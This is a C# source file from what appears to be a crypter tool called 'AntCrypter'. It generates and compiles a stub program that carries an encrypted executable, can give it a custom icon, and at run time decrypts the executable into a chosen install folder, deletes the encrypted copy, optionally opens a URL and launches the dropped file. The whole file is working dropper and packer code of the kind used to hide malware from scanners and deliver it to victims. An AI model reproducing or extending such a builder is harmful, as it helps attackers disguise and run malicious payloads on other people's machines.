using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Linq;
using System.Windows;
using System.IO;

namespace AntCrypter.ApplicationWorkers
{
    class PayloadWorker
    {
        public static bool IncludesEncryptedApp;
        public static string Errors;
        public static void Payload(byte[] EncrypedApp ,bool InstallerMode, string RawDirectory, bool OpenURLOnStartupMode, string StartupURI, bool CustomIconMode, string CustomIconDirectory, string EKey, string FileName, bool RunOnStartupSelected)
        {
            if(EncrypedApp != null)
            {
                IncludesEncryptedApp = true;
            }
            else
            {
                IncludesEncryptedApp = false;
            }
            MessageBox.Show("Received payload callback successfully" + Environment.NewLine + "Encrypting an appliaction: " + IncludesEncryptedApp + Environment.NewLine + "Installer mode: " + InstallerMode + Environment.NewLine + "Install directory: " + RawDirectory + Environment.NewLine + "Open URL on startup: " + OpenURLOnStartupMode + Environment.NewLine + "Custom icon mode: " + CustomIconMode); // For debug purposes.

            CSharpCodeProvider CryptProvider = new CSharpCodeProvider();

            CompilerParameters CryptProviderParameters = new CompilerParameters(new[] { "System.dll", "mscorlib.dll", "System.Core.dll", "System.Diagnostics.Process.dll" }, AppDomain.CurrentDomain.BaseDirectory + "Crypted.exe", true);
            CryptProviderParameters.GenerateExecutable = true;

            if (CustomIconMode)
            {
                    CryptProviderParameters.CompilerOptions = "/win32icon:" + CustomIconDirectory;
            }
            var EncryptedAppArray = "new byte[] { " + string.Join(", ", EncrypedApp) + " }";

            string Stub = @"using System;
using System.Threading;
using Microsoft.Win32;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;

namespace Tests
    {
        class Program
        {
            static void Main(string[] args)
            {
                byte[] Content = " + EncryptedAppArray + @";
                string EKey = """ + EKey + @""";
                string InstallDirectory = """ + RawDirectory + @""";
                string FileName = """ + FileName + @""";
                bool InstallerMode = " + InstallerMode.ToString().ToLower() + @";
                bool StartUpMode = " + RunOnStartupSelected.ToString().ToLower() + @"; 
                bool StartUpURLMode = " + OpenURLOnStartupMode.ToString().ToLower() + @";
                string StartUpURL = @""" + StartupURI + @""";
                string FullDirectory = InstallDirectory + FileName;
                ProcessStartInfo Payload = new ProcessStartInfo();
                Console.WriteLine(""Key: "" + EKey);

                if(InstallerMode == true)
                {
                    Console.WriteLine(""Instlaler mode was enabled. File will be installed to: "" + InstallDirectory);
                    if(InstallDirectory.Contains(""USERNAME""))
                    {
                        Console.WriteLine(""Default username selected for instalation."");
                        InstallDirectory = InstallDirectory.Replace(""USERNAME"",Environment.UserName);
                    }
                    Console.WriteLine(""File name: "" + FileName);
                    Console.WriteLine(""Full directory: "" + FullDirectory);

                    Directory.CreateDirectory(InstallDirectory);
                    Console.WriteLine(""Directory has been created"");
                }
                else
                {
                    Console.WriteLine(""Installer mode was disabled. File will be placed in the same folder!"");
                }
                if(StartUpURLMode == true)
                {
                    Console.WriteLine(""StartUp URL: mode enabled."");
                    Console.WriteLine(""StartUp URL: "" + StartUpURL);
                }
                else
                {
                    Console.WriteLine(""StartUp URL mode was disabled on setup..."");
                }
                string password = EKey;
                if(InstallerMode == true)
                {
                    File.WriteAllBytes(FullDirectory + "".AntCrypted"",Content);
                }
                else
                {
                    File.WriteAllBytes(AppDomain.CurrentDomain.BaseDirectory + ""Encrypted.exe.AntCrypted"", Content);
                }
                Console.WriteLine(""Encrypted file has been created"");


                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(password);
                if(InstallerMode == true)
                {
                    FileStream fsCrypt = new FileStream(FullDirectory + "".AntCrypted"", FileMode.Open);

                    RijndaelManaged RMCrypto = new RijndaelManaged();

                    CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, key), CryptoStreamMode.Read);

                    FileStream fsOut = new FileStream((InstallDirectory + ""\\"" + FileName).Replace("".AntCrypted"",""""), FileMode.Create);

                    int data;
                    while ((data = cs.ReadByte()) != -1)
                    {
                        fsOut.WriteByte((byte)data);
                    }
                    Console.WriteLine(""Finished writing data."");
                    Console.WriteLine(""Closing streams..."");
                    fsOut.Close();
                    cs.Close();
                    fsCrypt.Close();
                    Console.WriteLine(""Streams closed."");
                    Console.WriteLine(""Deleting encrypted file..."");
                }
                else
                {
                    FileStream fsCrypt = new FileStream(AppDomain.CurrentDomain.BaseDirectory + ""Encrypted.exe.AntCrypted"", FileMode.Open);

                    RijndaelManaged RMCrypto = new RijndaelManaged();

                    CryptoStream cs = new CryptoStream(fsCrypt, RMCrypto.CreateDecryptor(key, key), CryptoStreamMode.Read);

                    FileStream fsOut = new FileStream((AppDomain.CurrentDomain.BaseDirectory + ""Encrypted.exe.AntCrypted"").Replace("".AntCrypted"",""""), FileMode.Create);

                    int data;
                    while ((data = cs.ReadByte()) != -1)
                    {
                        fsOut.WriteByte((byte)data);
                    }
                    Console.WriteLine(""Finished writing data."");
                    Console.WriteLine(""Closing streams..."");
                    fsOut.Close();
                    cs.Close();
                    fsCrypt.Close();
                    Console.WriteLine(""Streams closed."");
                    Console.WriteLine(""Deleting encrypted file..."");
                }
                if(InstallerMode == true)
                {
                    File.Delete(InstallDirectory + ""\\"" + FileName + "".AntCrypted"");
                }
                else
                {
                    File.Delete(AppDomain.CurrentDomain.BaseDirectory + ""Encrypted.exe.AntCrypted"");
                }
                Console.WriteLine(""Encrypted file was deleted successfully!"");
                Console.WriteLine(""Decryption process complete!"");
                Console.WriteLine(""Registering tasks..."");
                if(StartUpURLMode == true)
                {
                    Console.WriteLine(""Opening startup URL..."");
                    System.Diagnostics.Process.Start(StartUpURL);
                    Console.WriteLine(""StarUp URL opened."");
                }
                if(StartUpMode == true)
                {
                    Console.WriteLine(""StartUp mode was enabled on setup! Process will run automatically!"");
                    if(InstallerMode == true)
                    {
                        Payload.FileName = InstallDirectory + ""\\"" + FileName;
                        Process.Start(Payload);
                    }
                    else
                    {
                        Payload.FileName = AppDomain.CurrentDomain.BaseDirectory + ""Encrypted.exe"";
                        Process.Start(Payload);
                    }
                    Console.WriteLine(""Tasks registered."");
                    Console.WriteLine(""Process started."");
                }
                else
                {
                    Console.WriteLine(""StartUp mode was disabled on setup! Process will not run automatically!"");
                }
                    Console.WriteLine(""Process will end in 5"");
                    Thread.Sleep(1000);
                    Console.WriteLine(""Process will end in 4"");
                    Thread.Sleep(1000);
                    Console.WriteLine(""Process will end in 3"");
                    Thread.Sleep(1000);
                    Console.WriteLine(""Process will end in 1"");
                    Thread.Sleep(1000);
                    Console.WriteLine(""Process exiting..."");
                    Thread.Sleep(1000);
            }
        }
    }
";
            File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\Stub.AntLog", Stub);

            var Result = CryptProvider.CompileAssemblyFromSource(CryptProviderParameters, Stub);
            if (Result.Errors.HasErrors)
            {
                Result.Errors.Cast<CompilerError>().ToList().ForEach(error => Errors += error.ErrorText);
                MessageBox.Show(Errors, "Error!", MessageBoxButton.OK, MessageBoxImage.Error);
                Errors = null;
            }
            else
            {
                MessageBox.Show("Successfully built encryped excecutable at " + AppDomain.CurrentDomain.BaseDirectory + "\\Cryped.exe", "Success!",MessageBoxButton.OK,MessageBoxImage.Information);
            }
        }
    }
}
